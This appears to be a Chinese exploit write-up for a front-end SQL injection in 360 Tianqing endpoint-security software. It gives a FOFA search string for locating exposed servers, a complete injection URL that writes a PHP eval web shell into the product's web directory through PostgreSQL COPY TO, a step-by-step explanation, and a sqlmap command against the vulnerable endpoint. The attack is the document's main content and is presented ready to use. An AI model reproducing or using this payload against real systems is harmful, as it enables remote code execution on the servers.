        <h1 id="天擎-前台SQL注入"><a href="#天擎-前台SQL注入" class="headerlink" title="天擎 前台SQL注入"></a>天擎 前台SQL注入</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>天擎 存在SQL注入,攻击者可以通过漏洞上传木马</p>
<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><blockquote>
<p>[!NOTE]</p>
<p>天擎</p>
</blockquote>
<h2 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h2><blockquote>
<p>[!NOTE]<br>title=”360新天擎”</p>
</blockquote>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">注入写shell:</span><br><span class="line">https://192.168.24.196:8443/api/dp/rptsvcsyncpoint?ccid=1&#x27;;create table O(T TEXT);insert into O(T) values(&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;);copy O(T) to &#x27;C:\Program Files (x86)\360\skylar6\www\1.php&#x27;;drop table O;--  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">利用过程:</span><br><span class="line">1. 通过安装包安装的一般都有root权限，因此该注入点可尝试写shell</span><br><span class="line">2. 通过注入点，创建一张表 O</span><br><span class="line">3. 为 表O 添加一个新字段 T 并且写入shell内容</span><br><span class="line">4. Postgres数据库 使用COPY TO把一个表的所有内容都拷贝到一个文件(完成写shell)</span><br><span class="line">5. 删除 表O</span><br></pre></td></tr></table></figure>

<p>使用命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u https://xxx.xxx.xxx.xxx:8443/api/dp/rptsvcsyncpoint?ccid=1 --dbms PostgreSQL</span><br></pre></td></tr></table></figure>

<p>![](/resource/天擎-前台SQL注入/media/1.png)</p>
